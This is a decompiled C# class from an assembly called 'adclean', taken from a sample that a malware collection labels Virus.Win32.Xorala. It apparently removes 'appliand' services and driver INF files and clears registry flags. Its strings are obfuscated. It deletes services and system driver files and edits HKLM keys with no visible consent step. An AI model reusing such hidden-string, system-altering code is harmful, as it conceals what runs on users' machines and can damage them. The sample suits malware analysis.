// Decompiled with JetBrains decompiler
// Type: cq
// Assembly: adclean, Version=4.3.2.0, Culture=neutral, PublicKeyToken=null
// MVID: 8BE3B19C-4917-4026-91F8-3303798D0739
// Assembly location: C:\Users\Administrateur\Desktop\Virusshare-00005-msil\Virus.Win32.Xorala-638ef39309b8dc3ac4f491699e58d83ce330d046ddcfc979beb800883c35104a.exe

using log4net;
using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.ServiceProcess;

internal class cq
{
  private const string a = "appliand";
  private const string b = "appliandMP";
  private const string c = "nt_appliandmp";
  private const uint d = 1;
  private const uint e = 983103;
  private const uint f = 983040;
  private const uint g = 1;
  private const uint h = 2;
  private const uint i = 4;
  private const uint j = 8;
  private const uint k = 16;
  private const uint l = 32;
  private const uint m = 64;
  private const uint n = 128;
  private const uint o = 256;
  private const uint p = 983551;
  private const int q = -536870334;
  private const int r = -2147180503;
  private static readonly ILog s = LogManager.GetLogger(typeof (cq));

  [DllImport("AdvApi32.dll")]
  private static extern IntPtr LockServiceDatabase(IntPtr A_0);

  [DllImport("AdvApi32.dll")]
  private static extern bool UnlockServiceDatabase(IntPtr A_0);

  [DllImport("AdvApi32.dll", SetLastError = true)]
  private static extern void CloseServiceHandle(IntPtr A_0);

  [DllImport("AdvApi32.dll", SetLastError = true)]
  private static extern bool DeleteService(IntPtr A_0);

  [DllImport("AdvApi32.dll", SetLastError = true)]
  private static extern IntPtr OpenService(IntPtr A_0, string A_1, uint A_2);

  [DllImport("advapi32.dll", SetLastError = true)]
  private static extern IntPtr OpenSCManager(string A_0, string A_1, uint A_2);

  [DllImport("Setupapi.dll")]
  private static extern bool SetupUninstallOEMInf(string A_0, uint A_1, IntPtr A_2);

  [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
  private static extern int FormatMessage(
    int A_0,
    ref IntPtr A_1,
    int A_2,
    int A_3,
    ref string A_4,
    int A_5,
    IntPtr A_6);

  private static string a(int A_0)
  {
    int A_1 = 14;
    string A_4 = string.Empty;
    switch (A_0)
    {
      case -2147180503:
        A_4 = \u003CModule\u003E.b("鋊ꋌ뫎\uF1D0믒듔ꇖ볘ﯚ꿜뫞胠胢跤苦跨쯪駬蟮铰폲飴零臸鋺郼諾氀⌂欄爆搈椊栌紎ㄐ簒猔㜖眘縚検栞丠儢两ܦ䐨䐪䌬䘮䔰尲䜴帶圸尺ᴼ帾ㅀ㍂⥄\u2E46⩈⩊㥌♎㹐㵒♔睖ⵘ㍚㱜⭞䅠ᑢ\u0C64०൨Ѫᩬᱮ兰ቲᥴ᭶ᙸ\u0C7A\u0E7C兾貀覂袄趆\uDA88\uEE8A\uE88C꾎\uE590ﮒ\uF094랖\uDF98\uDA9A천뾞튠욢욤펦삨쒪쎬辮\uDEB0\uDDB2閴삶캸첺鎼햾ꃀꣂ뛄돆\uA8C8\uE5CA껌ꃎ볐\uF3D2돔룖ꯘﯚ맜뫞闠苢賤详髨쯪苬臮퇰鯲髴胶\uD9F8迺鋼\uDFFE怀朂漄爆稈缊ⴌ笎礐瘒㔔稖砘挚琜爞吠丢Ԥ䤦尨䘪伬䨮䌰ጲ娴儶ᤸ伺唼娾㉀♂敄㍆え㭊⡌潎㹐㕒畔❖⭘㑚㩜ⵞ`\u0E62ᙤ䥦", A_1);
        break;
      case -536870334:
        A_4 = \u003CModule\u003E.b("鋊ꋌ뫎\uF1D0뷒냔닖뷘ﯚ\uA9DC냞쇠離闤菦裨\u9FEA裬쿮藰鯲郴ퟶ诸铺鋼课℀怂怄甆紈戊欌明爐爒愔爖樘㬚爜焞Ġ娢䨤刦嬨ପ䀬丮到嬲尴夶尸ᬺ吼儾慀ⱂ㝄⍆ⱈ㥊浌㭎㹐獒㑔㭖㕘㑚⩜罞ᕠୢ\u0C64ᑦ䥨ɪͬᱮհቲᥴ᭶\u1878ེᑼၾ\uEF80ꎂ\uF184\uE886ꦈ\uE88A\uE28C\uE18E\uE590朗ﮔ\uE296ﲘ떚邜閞겠ꦢ\uF5A4쮦첨쪪\uDEAC쪮醰삲킴튶馸쾺햼\uDABE\uE1C0藂蓄集\uE9C8\uA4CAꏌ\uEFCEꛐꓒꋔ淪돘뫚뛜곞闠苢쯤蓦蛨蛪췬觮黰臲헴鏶鳸迺鳼雾洀瀂┄栆月⬊攌怎昐㌒愔砖㤘椚砜氞丠伢匤䈦न弪䔬䘮䈰ጲ尴䐶䨸为堼ᄾ", A_1);
        break;
      default:
        try
        {
          int num1 = 256;
          int num2 = 512;
          int num3 = 4096;
          int maxValue = (int) byte.MaxValue;
          int A_0_1 = num1 | num3 | num2;
          IntPtr zero1 = IntPtr.Zero;
          IntPtr zero2 = IntPtr.Zero;
          A_4 = cq.FormatMessage(A_0_1, ref zero1, A_0, 0, ref A_4, maxValue, zero2) != 0 ? string.Format(\u003CModule\u003E.b("냊\uFDCC닎\uFFD0\uDED2\uDFD4\uDAD6폘诚뇜뫞胠郢胤쟦髨軪裬쿮藰鯲郴ퟶ뿸뫺과\uDFFE渀洂┄瀆縈簊⌌攎瀐砒昔挖砘㔚縜瀞䰠̢䌤䠦嬨ପ䤬䨮䔰刲尴嬶䨸ᬺ刼儾慀⭂⩄う楈㽊≌潎⍐㙒♔㡖㕘ⵚ㡜罞ᕠୢ\u0C64ᑦ䥨ɪṬᱮѰᙲ孴", A_1), (object) A_4) : string.Format(\u003CModule\u003E.b("車뿌뷎뻐ꇒ\uF5D4듖뛘뿚룜\uE5DE쇠飢헤髦쟨\uE6EA\uE7EC\uE2EEﯰꏲ駴鋶飸裺飼\uDFFE爀昂怄✆紈挊栌⼎圐划䐔㜖瘘甚㴜栞嘠吢ତ䴦䠨䀪帬嬮倰ᴲ嘴堶吸ᬺ嬼倾㍀捂⅄≆㵈⩊\u244C⍎≐獒㩔㥖祘㍚\u325C⡞䅠ᝢ\u0A64䝦᭨\u0E6AṬnᵰղၴ坶\u0D78\u137Aᑼ\u0C7Eꆀ\uEA82\uF684\uF486ﲈ\uEE8Aꎌ", A_1), (object) A_0);
          break;
        }
        catch (Exception ex)
        {
          A_4 = string.Format(\u003CModule\u003E.b("車뿌뷎뻐ꇒ\uF5D4듖뛘뿚룜\uE5DE쇠飢헤髦쟨쯪雬\uDEEE賰ﻲ\uFFF4\uFAF6\uF3F8\uABFA釼髾怀瀂怄✆稈渊栌⼎攐笒瀔㜖弘娚䰜㼞丠䴢Ԥ倦帨尪̬䔮倰堲䘴䌶堸ᔺ帼倾ⱀ捂⍄⡆㭈歊⥌⩎═\u3252㱔㭖⩘筚\u325Cㅞ䅠ୢ\u0A64ၦ䥨Ὢɬ佮Ͱᙲٴᡶᕸൺ\u187C彾\uF580\uEB82\uEC84\uF486ꦈ\uE28Aﺌﲎ\uE490\uF692뮔", A_1), (object) A_0, (object) ex.Message);
          break;
        }
    }
    return A_4;
  }

  private static string d() => cq.a(Marshal.GetLastWin32Error());

  private static void c()
  {
    int A_1 = 19;
    Console.WriteLine(string.Format(\u003CModule\u003E.b("菏럑뗓ꓕ믗닙뗛냝蟟싡苣觥髧쫩跫胭觯틱郳韵雷鷹郻韽滿攁␃欅愇搉攋縍缏怑怓㘕簗栙甛栝䔟倡圣", A_1)));
    bool flag = false;
    RegistryKey registryKey1 = (RegistryKey) null;
    try
    {
      registryKey1 = Registry.LocalMachine;
      RegistryKey registryKey2 = registryKey1.OpenSubKey(\u003CModule\u003E.b("菏译蟓苕鷗韙胛鷝闟郡難菥蛧黩꿫臭黯蛱蛳駵铷꧹駻諽峿䄁欃栅簇砉挋戍䰏儑砓眕欗椙䀛攝ᐟ昡ᜣဥ洧ጩᬫᰭᴯ眱ܳеഷ\u1739\u0D3B༽̿݁楃х็ॉ絋捍恏橑摓晕橗㡙ᥛ潝偟兡啣幥ᕧ", A_1));
      foreach (string subKeyName in registryKey2.GetSubKeyNames())
      {
        Console.WriteLine(string.Format(\u003CModule\u003E.b("菏럑뗓ꓕ믗닙뗛냝蟟싡\u9FE3훥闧", A_1), (object) subKeyName));
        RegistryKey registryKey3 = (RegistryKey) null;
        try
        {
          registryKey3 = registryKey2.OpenSubKey(subKeyName, true);
          if ((string) registryKey3.GetValue(\u003CModule\u003E.b("鏏뷑맓ꛕ럗듙맛냝铟ꯡ胣", A_1), (object) string.Empty) == \u003CModule\u003E.b("뻏ꛑ诓럕꣗\uAAD9냛럝臟賡胣该飧", A_1))
          {
            cq.a int32 = (cq.a) Convert.ToInt32(registryKey3.GetValue(\u003CModule\u003E.b("鏏뫑뗓ꓕ맗맙\uA8DB믝鋟诡韣鋥臧觩\u9FEB", A_1), (object) 0));
            Console.WriteLine(string.Format(\u003CModule\u003E.b("雏뷑ꇓ룕볗龎돛냝藟싡跣裥죧釩\uDCEB鏭탯藱鷳苵郷\uDAF9\u9FFB雽懿瀁攃攅簇漉縋服挏昑紓甕欗㨙望⼝崟", A_1), (object) subKeyName, (object) int32));
            if (int32 != (cq.a) 0)
            {
              cq.a a = int32 & ~cq.a.f;
              registryKey3.SetValue(\u003CModule\u003E.b("鏏뫑뗓ꓕ맗맙\uA8DB믝鋟诡韣鋥臧觩\u9FEB", A_1), (object) (uint) a, RegistryValueKind.DWord);
              flag = true;
              Console.WriteLine(string.Format(\u003CModule\u003E.b("苏럑맓맕껗뿙룛ﻝ껟ꇡꋣ맥ꛧꗩ룫뇭ꗯꇱ뇳ꓵꟷ꣹맻돽俿吁䔃䐅䐇伉∋⸍匏稑甓搕礗礙栛笝刟䬡圣別䄧䤩弫อ帯崱䌳ᘵ䌷ਹ䄻", A_1), (object) a));
            }
          }
        }
        catch (Exception ex)
        {
          Console.WriteLine(ex.Message);
        }
        finally
        {
          registryKey3?.Close();
        }
      }
    }
    catch (Exception ex)
    {
      Console.WriteLine(ex.Message);
    }
    finally
    {
      registryKey1?.Close();
    }
    if (flag)
      Console.WriteLine(string.Format(\u003CModule\u003E.b("\uEECF\uECD1\uEAD3\uE8D5\uE6D7龎飛뿝軟藡裣迥蛧跩쳫菭駯鳱鷳蛵韷裹裻跽\u20FF樁攃瀅洇⨉渋欍甏簑㐓瀕眗漙爛稝ฟȡ琣䨥䴧䬩弫䬭ု䄱䀳圵䨷丹᰻䜽⼿㝁㙃晅ⱇ⽉㩋❍㍏㝑瑓㭕㥗㑙㵛㥝՟ၡ䡣䙥᭧ɩͫᥭ偯ᩱᵳትᱷόቻ幽\uE47F\uE781\uF283\uEF85\uEB87\uEF89ﾋ꺍\uF68F\uE091ﮓﮕ뢗\uEE99\uF49Bﮝ肟\uF4A1춣쎥\uDFA7誩솫쮭\uDEAF잱钳ힵ횷\uDEB9鲻쮽꺿ꯁ\uAAC3뗅볇ꯉꃋꋍ\uF0CF돑뫓꿕\uF8D7鯙곛껝賟诡藣裥죧\uA7E9藫胭駯英鯳蓵賷觹\uDCFB髽槿焁球樅椇猉椋樍』朑稓爕紗栙㰛樝䠟䜡У䠥䴧帩嬫䄭䈯失ᐳ圵尷嬹䰻䨽┿ぁ㝃晅♇╉⡋⭍灏けⵓ癕⭗㽙せ㭝͟ᙡൣ\u0865ཧ䩩ᡫ٭ᕯά味\u1775ᙷṹ屻\u0A7D\uE87F\uE781\uEA83ꚅﲇ\uE289\uE98B꺍톏\uF191\uE093ﾕ\uF797\uF499벛ꂝ肟\uF7A1쪣쾥욧\uD9A9\uD8AB쾭\uDCAF\uDEB1钳\uDBB5\uDDB7풹즻邽\uE0BFﻁ\uF8C3鉶\uF4C7\uF6C9", A_1)));
    else
      Console.WriteLine(string.Format(\u003CModule\u003E.b("黏뷑\uF4D3닕맗듙믛닝觟賡菣웥藧菩苫蟭胯鷱蛳苵请\uDAF9髻釽痿氁怃⠅", A_1)));
  }

  private static void a(string A_0)
  {
    int A_1 = 18;
    Console.WriteLine(string.Format(\u003CModule\u003E.b("賎뷐뛒듔맖냘뗚뫜\uFFDE铠鏢엤菦鯨苪鯬諮菰폲蛴鋶诸跺铼鳾搀⌂縄㜆琈", A_1), (object) A_0));
    Console.WriteLine(string.Format(\u003CModule\u003E.b("鳎ꗐ볒ꗔ\uA7D6냘뗚뫜\uFFDE胠跢鳤쟦賨鏪蓬鳮藰髲鯴郶\uD9F8胺췼苾℀瀂怄甆缈戊渌樎", A_1), (object) A_0));
    try
    {
      ServiceController serviceController = new ServiceController(A_0);
      if (serviceController.Status != ServiceControllerStatus.Stopped)
      {
        serviceController.Stop();
        Console.WriteLine(\u003CModule\u003E.b("风냐뫒ꇔ뻖럘볚\uFDDC꫞釠쏢釤裦짨\uD9EA\uDDEC쿮苰雲雴飶韸\u9FFA軼\uDFFE最氂眄✆紈挊栌⼎甐愒簔愖簘椚㴜欞丠̢嘤匦䘨嬪ബ䴮吰唲娴䔶尸ᬺ帼倾⽀㝂ⱄ⥆㱈≊⍌⡎", A_1));
        serviceController.WaitForStatus(ServiceControllerStatus.Stopped, new TimeSpan(0, 0, 0, 20, 0));
      }
      serviceController.Close();
      IntPtr A_0_1 = cq.OpenSCManager((string) null, (string) null, 983103U);
      if (A_0_1.Equals((object) IntPtr.Zero))
      {
        Console.WriteLine(string.Format(\u003CModule\u003E.b("髎뿐뛒귔\uA7D6볘룚\uA9DC뫞藠쏢胤闦鯨蓪\u9FEC쿮黰菲郴駶郸闺髼\uDFFE刀䀂┄䨆済礊㜌⼎樐⌒栔", A_1), (object) cq.d()));
      }
      else
      {
        IntPtr A_0_2 = cq.LockServiceDatabase(A_0_1);
        if (A_0_2.Equals((object) IntPtr.Zero))
        {
          Console.WriteLine(string.Format(\u003CModule\u003E.b("髎뿐뛒귔\uA7D6볘룚\uA9DC뫞藠쏢胤闦鯨蓪\u9FEC쿮鷰鳲雴鳶郸闺髼\uDFFE刀䀂┄䨆済礊㜌⼎樐⌒栔", A_1), (object) cq.d()));
        }
        else
        {
          IntPtr A_0_3 = cq.OpenService(A_0_1, A_0, 983551U);
          if (A_0_3.Equals((object) IntPtr.Zero))
          {
            Console.WriteLine(string.Format(\u003CModule\u003E.b("髎뿐뛒귔\uA7D6볘룚\uA9DC뫞藠쏢胤闦鯨蓪\u9FEC쿮黰菲郴駶郸闺髼\uDFFE爀昂眄焆怈栊栌⼎樐⌒栔ⴖ㤘怚Ⱌ戞", A_1), (object) A_0, (object) cq.d()));
          }
          else
          {
            if (cq.DeleteService(A_0_3))
              Console.WriteLine(string.Format(\u003CModule\u003E.b("鳎ꓐ냒뛔닖\uAAD8\uA8DA믜꫞跠迢鳤쟦跨軪臬諮藰雲釴ퟶ鷸觺铼觾搀焂㼄✆爈㬊瀌", A_1), (object) A_0));
            else
              Console.WriteLine(string.Format(\u003CModule\u003E.b("髎뿐뛒귔\uA7D6볘룚\uA9DC뫞藠쏢胤闦鯨蓪\u9FEC쿮闰雲駴鋶跸鋺鏼飾℀瀂怄甆缈戊渌樎ㄐ栒└樖⌘㬚昜⸞尠", A_1), (object) A_0, (object) cq.d()));
            cq.CloseServiceHandle(A_0_3);
          }
          cq.UnlockServiceDatabase(A_0_2);
        }
        cq.CloseServiceHandle(A_0_1);
      }
    }
    catch (Exception ex)
    {
      Console.WriteLine(ex.Message, (object) ex);
    }
  }

  private static void b()
  {
    int A_1 = 14;
    string str1 = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.System), \u003CModule\u003E.b("믊ꏌ뿎ꓐ\uA7D2볔믖\uF7D8뻚ꗜ뫞", A_1));
    string path1 = Path.Combine(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.System), \u003CModule\u003E.b("\uE5CA\uE3CC", A_1)), \u003CModule\u003E.b("ꋊꏌ\uA9CE", A_1));
    if (Directory.Exists(path1))
    {
      string[] files = Directory.GetFiles(path1, \u003CModule\u003E.b("\uA4CA\uA8CCꋎ\uFBD0\uFDD2볔맖뿘", A_1));
      Console.WriteLine(string.Format(\u003CModule\u003E.b("跊ꋌ뫎뿐럒\uF5D4곖\uE9D8ꛚ\uFDDC뛞迠藢엤臦胨蟪裬鳮퇰髲鯴ퟶ苸쫺胼", A_1), (object) files.Length, (object) path1));
      for (int index = 0; index < files.Length; ++index)
      {
        Console.WriteLine(string.Format(\u003CModule\u003E.b("飊\uA8CC껎ꏐ냒뷔뻖럘볚\uFDDCꓞ퇠黢엤", A_1), (object) files[index]));
        StreamReader streamReader = (StreamReader) null;
        try
        {
          streamReader = File.OpenText(files[index]);
          string str2 = streamReader.ReadLine();
          if (str2 != null && (str2.ToLower().Equals(\u003CModule\u003E.b("\uF0CA\uEDCC\uE2CEﳐ\uF3D2듔\uA7D6꧘럚드뻞迠蟢쯤軦蟨跪췬싮\uDCF0", A_1)) || str2.ToLower().Equals(\u003CModule\u003E.b("\uF0CA\uEDCC\uE2CEﳐ\uF3D2듔\uA7D6꧘럚드뻞迠蟢뫤諦쟨苪菬觮퇰\uDEF2\uD8F4", A_1))))
          {
            streamReader.Close();
            bool flag = false;
            try
            {
              Console.WriteLine(string.Format(\u003CModule\u003E.b("駊\uA8CCꋎ뻐ꗒ볔맖뻘ﯚ드뇞蟠\uD9E2엤鳦\uD9E8雪", A_1), (object) files[index]));
              if (cq.a())
              {
                Process process1 = new Process();
                process1.OutputDataReceived += new DataReceivedEventHandler(cq.a);
                process1.ErrorDataReceived += new DataReceivedEventHandler(cq.b);
                process1.StartInfo.FileName = str1;
                process1.StartInfo.Arguments = string.Format(\u003CModule\u003E.b("\uE6CA꧌\uEFCE\uAAD0\uE3D2꣔", A_1), (object) Path.GetFileName(files[index]));
                process1.StartInfo.CreateNoWindow = true;
                process1.StartInfo.UseShellExecute = false;
                process1.StartInfo.WorkingDirectory = path1;
                process1.StartInfo.RedirectStandardError = true;
                process1.StartInfo.RedirectStandardOutput = true;
                process1.Start();
                process1.BeginErrorReadLine();
                process1.BeginOutputReadLine();
                process1.WaitForExit();
                if (process1.ExitCode == 0)
                {
                  Console.WriteLine(string.Format(\u003CModule\u003E.b("駊\uA8CCꋎ뻐ꗒ냔돖律껚껜뛞迠蓢엤韦蟨鯪飬鯮飰\u9FF2\uDBF4鋶臸黺\uDDFC틾攀", A_1)));
                }
                else
                {
                  Process process2 = new Process();
                  process2.OutputDataReceived += new DataReceivedEventHandler(cq.a);
                  process2.ErrorDataReceived += new DataReceivedEventHandler(cq.b);
                  process2.StartInfo.FileName = str1;
                  process2.StartInfo.Arguments = string.Format(\u003CModule\u003E.b("\uE6CAꯌ\uEFCEﳐ럒\uF5D4곖\uE9D8ꛚ", A_1), (object) Path.GetFileName(files[index]));
                  process2.StartInfo.CreateNoWindow = true;
                  process2.StartInfo.UseShellExecute = false;
                  process2.StartInfo.WorkingDirectory = path1;
                  process2.StartInfo.RedirectStandardError = true;
                  process2.StartInfo.RedirectStandardOutput = true;
                  process2.Start();
                  process2.BeginErrorReadLine();
                  process2.BeginOutputReadLine();
                  process2.WaitForExit();
                  if (process2.ExitCode == 0)
                    Console.WriteLine(string.Format(\u003CModule\u003E.b("駊\uA8CCꋎ뻐ꗒ냔돖律껚껜뛞迠蓢엤韦蟨鯪飬鯮飰\u9FF2\uDBF4鋶臸黺\uDDFC틾最⌂⠄挆", A_1)));
                  else
                    flag = true;
                }
              }
              else if (cq.SetupUninstallOEMInf(Path.GetFileName(files[index]), 1U, IntPtr.Zero))
                Console.WriteLine(string.Format(\u003CModule\u003E.b("駊\uA8CCꋎ뻐ꗒ냔돖律껚껜뛞迠蓢엤듦賨\u9FEA飬\u9FEEꓰ鷲鳴駶諸迺鳼鏾洀䰂䀄䨆䀈攊欌", A_1)));
              else
                flag = true;
            }
            catch (Exception ex)
            {
              Console.WriteLine(ex.Message, (object) ex);
            }
            if (flag)
            {
              try
              {
                File.Delete(files[index]);
                Console.WriteLine(string.Format(\u003CModule\u003E.b("駊\uA8CCꋎ뻐ꗒ냔돖律껚껜뛞迠蓢엤ꏦ賨蟪裬鯮铰", A_1)));
              }
              catch (Exception ex)
              {
                Console.WriteLine(ex.Message, (object) ex);
              }
              try
              {
                string path2 = Path.ChangeExtension(files[index], \u003CModule\u003E.b("鯊菌觎", A_1));
                Console.WriteLine(string.Format(\u003CModule\u003E.b("駊\uA8CCꋎ뻐ꗒ볔맖뻘ﯚ규뇞蟠\uD9E2엤鳦\uD9E8雪", A_1), (object) path2));
                File.Delete(path2);
              }
              catch (Exception ex)
              {
                Console.WriteLine(ex.Message, (object) ex);
              }
            }
          }
          else
            streamReader.Close();
        }
        catch (Exception ex)
        {
          streamReader?.Close();
          Console.WriteLine(ex.Message, (object) ex);
        }
      }
    }
    else
      Console.WriteLine(string.Format(\u003CModule\u003E.b("냊\uFDCC닎\uF1D0럒뫔닖\uAAD8뗚\uA9DC\uFFDE蓠鯢賤铦鷨", A_1), (object) path1));
  }

  private static void b(object A_0, DataReceivedEventArgs A_1) => Console.WriteLine(A_1.Data);

  private static void a(object A_0, DataReceivedEventArgs A_1) => Console.WriteLine(A_1.Data);

  private static bool a()
  {
    int A_1_1 = 16;
    if (IntPtr.Size == 8)
      return true;
    bool A_1_2;
    return cq.a(\u003CModule\u003E.b("ꛌ\uAACEꏐ뷒냔믖\uEAD8\uE9DA\uF3DC믞跠迢", A_1_1), \u003CModule\u003E.b("蓌볎蛐볒ꋔ\uE1D6\uEDD8诚꿜냞苠蛢雤铦", A_1_1)) && cq.IsWow64Process(cq.GetCurrentProcess(), out A_1_2) && A_1_2;
  }

  private static bool a(string A_0, string A_1)
  {
    IntPtr moduleHandle = cq.GetModuleHandle(A_0);
    return !(moduleHandle == IntPtr.Zero) && cq.GetProcAddress(moduleHandle, A_1) != IntPtr.Zero;
  }

  [DllImport("kernel32.dll")]
  private static extern IntPtr GetCurrentProcess();

  [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
  private static extern IntPtr GetModuleHandle(string A_0);

  [DllImport("kernel32", CharSet = CharSet.Auto, SetLastError = true)]
  private static extern IntPtr GetProcAddress(IntPtr A_0, [MarshalAs(UnmanagedType.LPStr)] string A_1);

  [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
  [return: MarshalAs(UnmanagedType.Bool)]
  private static extern bool IsWow64Process(IntPtr A_0, out bool A_1);

  private static void a(string[] A_0)
  {
    int A_1 = 13;
    Console.WriteLine(string.Format(\u003CModule\u003E.b("껉뻋\uA7CDꛏ럑ꛓ\uF6D5믗뛙맛뿝軟韡铣웥엧쫩軫语韯鯱髳", A_1)));
    foreach (string str in A_0)
    {
      if (str.Equals(\u003CModule\u003E.b("ꏉꋋ\uA8CD", A_1)))
        cq.b();
      else if (str.Equals(\u003CModule\u003E.b("막꧋볍ꛏ믑럓돕", A_1)))
      {
        cq.a(\u003CModule\u003E.b("ꯉ볋뻍볏믑뗓룕볗", A_1));
        cq.a(\u003CModule\u003E.b("ꯉ볋뻍볏믑뗓룕볗韙賛", A_1));
      }
      else if (str.Equals(\u003CModule\u003E.b("\uA7C9ꗋꃍ맏ꋑ믓ꓕ곗", A_1)))
        cq.c();
    }
    Console.WriteLine(string.Format(\u003CModule\u003E.b("軉뻋\uA7CDꛏ럑ꛓ\uF6D5믗뛙맛뿝軟韡铣웥엧쫩觫胭铯", A_1)));
  }

  [Flags]
  public enum a : uint
  {
    a = 1,
    b = 2,
    c = 4,
    d = 8,
    e = 16, // 0x00000010
    f = 32, // 0x00000020
    g = 64, // 0x00000040
    h = 128, // 0x00000080
    i = 1024, // 0x00000400
    j = 16384, // 0x00004000
  }
}
